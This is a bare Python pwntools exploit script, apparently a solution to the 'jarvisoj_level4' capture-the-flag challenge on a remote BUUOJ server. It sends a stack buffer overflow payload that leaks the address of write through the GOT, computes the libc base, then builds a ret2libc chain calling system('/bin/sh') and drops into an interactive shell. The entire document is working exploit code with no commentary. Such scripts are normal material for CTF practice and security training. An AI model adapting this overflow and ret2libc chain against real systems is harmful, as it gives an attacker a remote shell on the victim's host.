from pwn import *

r = remote('node5.buuoj.cn', 29917)
elf = ELF(r'../../pwn_file/jarvisoj_level4')
libc = ELF(r'../libc/libc-2.23_32.so')
context.log_level = 'debug'

vul_addr = 0x804844B

write_got = elf.got['write']
write_plt = elf.plt['write']

payload = b'A' * (0x88 + 4) + p32(write_plt) + p32(vul_addr) + p32(1) + p32(write_got) + p32(0x8)

r.sendline(payload)
write_addr = u32(r.recv(4))
print(hex(write_addr))

base_addr = write_addr - libc.sym['write']
system_addr = base_addr + libc.sym['system']
sh_addr = base_addr + libc.search(b'/bin/sh').__next__()

payload2 = b'A' * (0x88 + 4) + p32(system_addr) + p32(vul_addr) + p32(sh_addr)
r.sendline(payload2)
r.interactive()
